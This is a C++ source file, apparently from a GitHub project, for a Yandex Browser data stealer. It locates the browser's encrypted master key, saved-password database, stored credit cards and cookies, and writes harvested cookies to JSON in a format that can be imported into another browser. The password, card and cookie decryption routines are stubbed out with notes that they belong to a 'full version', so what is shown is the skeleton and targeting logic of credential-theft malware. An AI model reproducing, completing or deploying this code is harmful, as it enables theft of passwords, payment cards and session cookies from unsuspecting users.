//yandex_module.cpp
// github: github.com/s4yr3x
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#define _CRT_SECURE_NO_WARNINGS

#include <fstream>
#include <filesystem>
#include <vector>
#include <cstring>
#include <ntstatus.h>
#include <windows.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <nlohmann/json.hpp>
#include <sstream>
#include <string>

#include "yandex_module.h"
#include "aes256gcm.h"
#include "base64.h"
#include "sha1.h"

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;
using json = nlohmann::json;

YaDecryptor::YaDecryptor(const char* user_data_path, const char* profile_name)
    : _user_data_path(user_data_path),
    _profile_name(profile_name)
{
    fs::path profile_path = _user_data_path;

    _local_state_path = (profile_path / "Local State").string();

    profile_path /= _profile_name;

    _profile_path = profile_path.string();

    _passwords_path = (profile_path / "Ya Passman Data").string();
    _cards_path = (profile_path / "Ya Credit Cards").string();
    _cookies_path = (profile_path / "Network" / "Cookies").string();
}

YaDecryptor::~YaDecryptor()
{
}

std::string YaDecryptor::decrypt_ls_key(std::string& key_base64)
{
    // [YandexModule] This functionality is part of the full version only.
}

void YaDecryptor::init()
{
    std::ifstream f(_local_state_path);

    json data = json::parse(f);

    std::string key_base64 = data["os_crypt"]["encrypted_key"];

    _ls_key = decrypt_ls_key(key_base64);
}

std::string YaDecryptor::get_le_key(sqlite3* db_ctx)
{
    sqlite3_stmt* stmt_le{ 0 };

    try {
        // [YandexModule] This functionality is part of the full version only.
    }
    catch (...) {
        sqlite3_finalize(stmt_le);

        throw;
    }
    
    return "";
}

std::string YaDecryptor::get_le_key1()
{
    return _le_key;
}

std::vector<decrypted_password_t> YaDecryptor::get_passwords()
{
    std::vector<decrypted_password_t> passwords;

    sqlite3* db_ctx{ 0 };
    sqlite3_stmt* stmt{ 0 };

    try {
        // [YandexModule] This functionality is part of the full version only.
    }
    catch (...) {
        sqlite3_finalize(stmt);
        sqlite3_close(db_ctx);

        throw;
    }

    return passwords;
}

std::vector<decrypted_cc_t> YaDecryptor::get_credit_cards()
{
    std::vector<decrypted_cc_t> credit_cards;

    sqlite3* db_ctx{ 0 };
    sqlite3_stmt* stmt{ 0 };

    try {
        // [YandexModule] This functionality is part of the full version only.
    }
    catch (...) {
        sqlite3_finalize(stmt);
        sqlite3_close(db_ctx);

        throw;
    }

    return credit_cards;
}

std::vector<decrypted_cookie_t> YaDecryptor::get_cookies()
{
    std::vector<decrypted_cookie_t> cookies;
    sqlite3* db_ctx = nullptr;
    sqlite3_stmt* stmt = nullptr;
    int cookie_id = 1;

    try {
        // [YandexModule] This functionality is part of the full version only.

        sqlite3_finalize(stmt);
        sqlite3_close(db_ctx);
    }
    catch (const std::exception& ex) {
        MessageBoxA(0, ex.what(), "get_cookies() error", 0);
        if (stmt) sqlite3_finalize(stmt);
        if (db_ctx) sqlite3_close(db_ctx);
    }

    return cookies;
}

void write_cookies_json(const std::vector<Cookie>& cookies, const std::string& filepath) {
    std::ofstream out(filepath, std::ios::binary);
    if (!out.is_open()) return;

    out << "[\n";
    for (size_t i = 0; i < cookies.size(); ++i) {
        const Cookie& c = cookies[i];
        out << "  {\n";
        out << "    \"domain\": \"" << c.domain << "\",\n";
        out << "    \"expirationDate\": " << std::fixed << std::setprecision(0) << c.expirationDate << ",\n";
        out << "    \"hostOnly\": " << (c.hostOnly ? "true" : "false") << ",\n";
        out << "    \"httpOnly\": " << (c.httpOnly ? "true" : "false") << ",\n";
        out << "    \"name\": \"" << c.name << "\",\n";
        out << "    \"path\": \"" << c.path << "\",\n";
        out << "    \"secure\": " << (c.secure ? "true" : "false") << ",\n";
        out << "    \"session\": " << (c.session ? "true" : "false") << ",\n";
        out << "    \"storeId\": \"" << c.storeId << "\",\n";

        out << "    \"value\": \"";
        for (unsigned char ch : c.value) {
            switch (ch) {
            case '\"': out << "\\\""; break;
            case '\\': out << "\\\\"; break;
            case '\b': out << "\\b"; break;
            case '\f': out << "\\f"; break;
            case '\n': out << "\\n"; break;
            case '\r': out << "\\r"; break;
            case '\t': out << "\\t"; break;
            default:
                if (ch < 0x20) {
                    out << ' ';
                }
                else {
                    out << ch;
                }
                break;
            }
        }
        out << "\",\n";

        out << "    \"id\": " << c.id << "\n";
        out << "  }" << (i + 1 < cookies.size() ? "," : "") << "\n";
    }
    out << "]";
    out.close();
}


void ExtractYandexData() {
    try {
        // [YandexModule] This functionality is part of the full version only.
    }  
    catch (const std::exception& ex) {  
        MessageBoxA(0, ex.what(), "Error", MB_ICONERROR);  
    }  
    catch (...) {  
        MessageBoxA(0, "An unknown error occurred", "Error", MB_ICONERROR);  
    }
}